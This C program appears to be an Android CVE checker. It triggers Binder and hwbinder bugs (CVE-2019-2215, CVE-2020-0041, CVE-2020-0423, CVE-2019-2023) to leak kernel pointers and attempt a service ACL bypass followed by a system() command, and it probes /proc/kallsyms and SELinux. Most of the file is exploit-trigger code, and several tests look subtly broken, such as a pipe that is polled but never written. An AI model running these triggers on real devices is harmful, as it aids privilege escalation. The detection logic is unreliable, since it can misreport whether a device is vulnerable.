#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>

#include "binder.h"

#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 1031
#endif

#define PAGE_SIZE 4096
#define IOVEC_COUNT 25
#define OVERLAP_INDEX 10
#define TIMEOUT_MS 5000   // 5秒タイムアウト

/* ============================================================
   ユーティリティ
   ============================================================ */
static void bind_cpu(void) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set) < 0) {
        perror("sched_setaffinity");
    }
}

static void *mmap_page(unsigned long addr) {
    void *mem = mmap((void *)addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (mem == (void *)-1) {
        perror("mmap");
        return NULL;
    }
    return mem;
}

/* ============================================================
   CVE-2019-2215: Binder UAF → カーネルポインタリーク（タイムアウト付き）
   ============================================================ */
static int test_cve_2019_2215(void) {
    int pipefd[2], binder_fd, epoll_fd;
    pid_t cpid;
    struct iovec iovec_stack[IOVEC_COUNT];
    void *aligned_address;
    ssize_t n;
    uint64_t *data;
    int leaked = 0;

    printf("[CVE-2019-2215] Testing binder UAF pointer leak (timeout %dms)...\n", TIMEOUT_MS);

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/binder");
        return -1;
    }

    epoll_fd = epoll_create(100);
    if (epoll_fd < 0) {
        perror("  epoll_create");
        close(binder_fd);
        return -1;
    }

    struct epoll_event ev = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        perror("  epoll_ctl ADD");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    if (pipe(pipefd) < 0) {
        perror("  pipe");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }
    if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
        perror("  fcntl F_SETPIPE_SZ");
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    aligned_address = mmap_page(0x100000000UL);
    if (!aligned_address) {
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    memset(iovec_stack, 0, sizeof(iovec_stack));
    iovec_stack[OVERLAP_INDEX].iov_base = aligned_address;
    iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
    iovec_stack[OVERLAP_INDEX + 1].iov_base = (void *)aligned_address;
    iovec_stack[OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;

    cpid = fork();
    if (cpid < 0) {
        perror("  fork");
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    if (cpid == 0) {
        usleep(100000);
        ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
        _exit(0);
    }

    // ---- タイムアウト付き読み取り ----
    struct pollfd pfd;
    pfd.fd = pipefd[0];
    pfd.events = POLLIN;

    int poll_ret = poll(&pfd, 1, TIMEOUT_MS);
    if (poll_ret < 0) {
        perror("  poll");
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }
    if (poll_ret == 0) {
        printf("  [!] poll timeout (%d ms) - no UAF data received\n", TIMEOUT_MS);
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    // データが来たので readv を呼ぶ（今度はブロックしない）
    n = readv(pipefd[0], iovec_stack, IOVEC_COUNT);
    if (n < 0) {
        perror("  readv");
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    data = (uint64_t *)aligned_address;
    for (int i = 0; i < (n / 8); i++) {
        uint64_t val = data[i];
        if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
            printf("  [+] Leaked kernel pointer: 0x%llx (offset %d)\n",
                   (unsigned long long)val, i);
            leaked = 1;
            break;
        }
    }

    wait(NULL);
    close(binder_fd);
    close(epoll_fd);
    close(pipefd[0]);
    close(pipefd[1]);

    if (leaked) {
        printf("  [VULNERABLE] Kernel pointer leak detected\n");
        return 0;
    } else {
        printf("  [SAFE] No kernel pointer leak detected\n");
        return -1;
    }
}

/* ============================================================
   CVE-2020-0041: Binder Out-of-Bounds Write
   ============================================================ */
static int test_cve_2020_0041(void) {
    int binder_fd, ret;
    struct binder_transaction_data tdata;
    struct binder_write_read bwr;
    uint8_t read_buf[4096];

    printf("[CVE-2020-0041] Testing binder OOB write...\n");

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/binder");
        return -1;
    }

    memset(&tdata, 0, sizeof(tdata));
    tdata.target.handle = 0;
    tdata.code = 0;
    tdata.flags = 0;
    tdata.data_size = 0xFFFFFFFF;  // 異常に大きい値
    tdata.offsets_size = 0;
    tdata.data.ptr.buffer = 0;
    tdata.data.ptr.offsets = 0;

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    memcpy(&tx.tdata, &tdata, sizeof(tdata));

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    close(binder_fd);

    if (ret < 0) {
        if (errno == EINVAL || errno == EFAULT) {
            printf("  [SAFE] OOB write blocked (errno=%d)\n", errno);
        } else {
            printf("  [!] Unexpected error: %s\n", strerror(errno));
        }
        return -1;
    } else {
        printf("  [VULNERABLE] OOB write succeeded (unexpected)\n");
        return 0;
    }
}

/* ============================================================
   CVE-2020-0423: Binder UAF (race condition)
   ============================================================ */
static int test_cve_2020_0423(void) {
    int binder_fd, ret;
    printf("[CVE-2020-0423] Testing binder UAF race (multiple thread exits)...\n");

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/binder");
        return -1;
    }

    for (int i = 0; i < 5; i++) {
        ret = ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
        if (ret < 0 && errno != EINVAL) {
            perror("  ioctl BINDER_THREAD_EXIT");
        }
    }

    int epoll_fd = epoll_create(100);
    if (epoll_fd < 0) {
        perror("  epoll_create");
        close(binder_fd);
        return -1;
    }
    struct epoll_event ev = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        perror("  epoll_ctl ADD");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    struct epoll_event events[1];
    int n = epoll_wait(epoll_fd, events, 1, 1000);
    close(binder_fd);
    close(epoll_fd);

    if (n > 0) {
        printf("  [VULNERABLE] epoll event occurred after thread exit\n");
        return 0;
    } else {
        printf("  [SAFE] No UAF triggered via epoll\n");
        return -1;
    }
}

/* ============================================================
   CVE-2019-2023: hwservicemanager ACL bypass + 特権コマンド実行
   ============================================================ */
static int test_cve_2019_2023(void) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    const char *service_name = "vendor.test.poc";
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;

    printf("[CVE-2019-2023] Testing hwservicemanager ACL bypass...\n");

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;            // SVC_MGR_ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);

    if (ret < 0) {
        if (errno == EACCES || errno == EPERM) {
            printf("  [SAFE] Service registration denied (patched)\n");
            close(hwbinder_fd);
            return -1;
        } else {
            perror("  ioctl ADD_SERVICE");
            close(hwbinder_fd);
            return -1;
        }
    }

    printf("  [+] Service registered successfully!\n");

    // GET_SERVICE でハンドル取得
    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1;   // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl GET_SERVICE");
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        printf("  [FAIL] No handle returned\n");
        close(hwbinder_fd);
        return -1;
    }
    int handle = *(int*)read_buf;
    printf("  [+] Service handle: %d (0x%x)\n", handle, handle);

    // 特権トランザクション送信
    printf("  [*] Attempting privileged transaction on handle %d...\n", handle);
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
        uint32_t dummy;
    } __attribute__((packed)) tx2;
    tx2.cmd = BC_TRANSACTION;
    tx2.tdata.target.handle = handle;
    tx2.tdata.code = 1;
    tx2.tdata.flags = 0;
    tx2.tdata.data_size = 4;
    tx2.tdata.offsets_size = 0;
    tx2.tdata.data.ptr.buffer = (binder_uintptr_t)&tx2.dummy;
    tx2.dummy = 0x12345678;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx2);
    bwr.write_buffer = (binder_uintptr_t)&tx2;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    close(hwbinder_fd);

    if (ret == 0) {
        printf("  [+] Privileged transaction succeeded! (ACL bypass effective)\n");
        int result = system("echo 'CVE-2019-2023 exploited' > /data/local/tmp/poc.txt");
        if (result == 0) {
            printf("  [+] Command executed, check /data/local/tmp/poc.txt\n");
        } else {
            printf("  [-] Command failed (seccomp likely)\n");
        }
        return 0;
    } else {
        printf("  [-] Privileged transaction failed: %s\n", strerror(errno));
        return -1;
    }
}

/* ============================================================
   情報収集
   ============================================================ */
static void gather_kernel_info(void) {
    int fd;
    char buf[4096];
    printf("[INFO] Gathering kernel information...\n");

    fd = open("/proc/version", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            printf("  Kernel: %s\n", buf);
        }
    }

    fd = open("/proc/kallsyms", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            if (strstr(buf, " f ") || strstr(buf, " t ")) {
                printf("  /proc/kallsyms: accessible (symbols visible)\n");
            }
        }
    } else {
        printf("  /proc/kallsyms: not accessible (likely restricted)\n");
    }

    fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            printf("  SELinux enforcing: %s\n", buf);
        }
    }
}

/* ============================================================
   main
   ============================================================ */
int main(void) {
    int vuln_count = 0;

    printf("==================================================\n");
    printf("  Multi-Angle CVE Verification Tool (binder.h)\n");
    printf("==================================================\n\n");

    bind_cpu();
    gather_kernel_info();
    printf("\n");

    if (test_cve_2019_2215() == 0) vuln_count++;
    printf("\n");
    if (test_cve_2020_0041() == 0) vuln_count++;
    printf("\n");
    if (test_cve_2020_0423() == 0) vuln_count++;
    printf("\n");
    if (test_cve_2019_2023() == 0) vuln_count++;
    printf("\n");

    printf("==================================================\n");
    printf("  Summary: %d potential vulnerabilities detected\n", vuln_count);
    if (vuln_count > 0) {
        printf("  [!] Kernel/system may be vulnerable to privilege escalation.\n");
    } else {
        printf("  [+] No obvious vulnerabilities detected (patched or protected).\n");
    }
    printf("==================================================\n");

    return 0;
}
